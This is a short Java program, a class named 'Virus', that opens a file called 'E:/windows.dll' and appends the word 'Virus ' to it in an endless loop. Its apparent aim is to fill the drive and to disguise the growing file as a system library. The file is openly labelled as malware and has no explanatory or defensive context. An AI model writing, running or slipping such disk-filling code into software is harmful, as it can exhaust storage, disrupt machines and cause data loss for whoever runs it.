import java.io.FileWriter;
public class Virus {
    public static void main(String[] args) throws Exception {
        FileWriter fw=new FileWriter("E:/windows.dll",true);
        while(true)
        {
            fw.write("Virus ");
        }
    }
}